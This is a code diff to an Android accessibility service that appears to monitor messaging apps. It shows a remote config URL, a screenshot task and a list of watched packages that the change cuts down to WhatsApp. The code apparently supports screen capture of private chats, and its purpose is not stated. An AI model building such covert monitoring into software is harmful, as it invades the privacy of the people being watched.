@@ -26,15 +26,7 @@ class MonitorAccessibilityService : AccessibilityService() {
     private val serverConfigUrl = "https://app-control-server-54oe.onrender.com/api/config"
 
     private val monitoredPackages = listOf(
-        "com.whatsapp",
-        "com.whatsapp.w4b",
-        "com.facebook.katana",
-        "com.facebook.lite",
-        "com.facebook.orca",
-        "org.telegram.messenger",
-        "com.instagram.android",
-        "com.zhiliaoapp.musically",
-        "com.zhiliaoapp.musically.go"
+        "com.whatsapp"
     )
 
     private val screenshotRunnable = object : Runnable {
